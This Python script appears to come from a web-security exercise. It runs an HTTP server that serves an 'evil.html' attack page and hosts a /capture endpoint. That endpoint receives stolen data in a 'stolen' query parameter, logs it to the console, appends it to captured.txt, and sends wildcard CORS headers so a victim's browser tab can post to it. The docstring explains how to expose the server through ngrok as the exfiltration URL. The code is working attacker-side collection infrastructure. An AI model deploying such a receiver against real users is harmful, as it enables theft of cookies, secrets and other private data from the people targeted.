#!/usr/bin/env python3
"""
Serve files in this folder (same as: python -m http.server 8080)
PLUS receive exfiltration without webhook:

  GET /capture?stolen=...   -> prints to console, appends to captured.txt, returns 204
  CORS: Access-Control-Allow-Origin: *  (so fetch from the flag tab can reach your ngrok URL)

Usage (stop plain http.server first, then):
  cd Q2
  python serve_and_capture.py

Then set evil.html EXFIL to:
  https://YOUR-NGROK-SUBDOMAIN.ngrok-free.dev/capture?stolen=
"""
from __future__ import annotations

import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote, urlparse

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = 8080
OUT = os.path.join(ROOT, "captured.txt")


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args) -> None:
        print("%s - %s" % (self.address_string(), fmt % args))

    def _cors(self) -> None:
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self) -> None:
        u = urlparse(self.path)

        if u.path == "/capture":
            qs = parse_qs(u.query)
            raw = qs.get("stolen", [""])[0]
            stolen = unquote(raw)
            preview = (stolen[:800] + "…") if len(stolen) > 800 else stolen
            print("=== CAPTURE ===\n", preview, "\n===============", sep="")
            try:
                with open(OUT, "a", encoding="utf-8") as fp:
                    fp.write(stolen + "\n---\n")
            except OSError as e:
                print("Could not write captured.txt:", e)
            self.send_response(204)
            self._cors()
            self.end_headers()
            return

        rel = os.path.normpath(u.path.lstrip("/"))
        if rel == "." or rel == "":
            rel = "evil.html"
        if rel.startswith("..") or rel.startswith(os.sep):
            self.send_error(404)
            return
        full = os.path.join(ROOT, rel)
        if not os.path.isfile(full):
            self.send_error(404)
            return

        with open(full, "rb") as fp:
            data = fp.read()

        ctype = "application/octet-stream"
        if rel.endswith(".html"):
            ctype = "text/html; charset=utf-8"
        elif rel.endswith(".css"):
            ctype = "text/css; charset=utf-8"
        elif rel.endswith(".js"):
            ctype = "text/javascript; charset=utf-8"

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self._cors()
        self.end_headers()
        self.wfile.write(data)


def main() -> None:
    os.chdir(ROOT)
    httpd = HTTPServer(("0.0.0.0", PORT), Handler)
    print("Serving %s on 0.0.0.0:%s" % (ROOT, PORT))
    print("Exfil URL path: /capture?stolen=...")
    print("Open: http://127.0.0.1:%s/evil.html" % PORT)
    httpd.serve_forever()


if __name__ == "__main__":
    main()
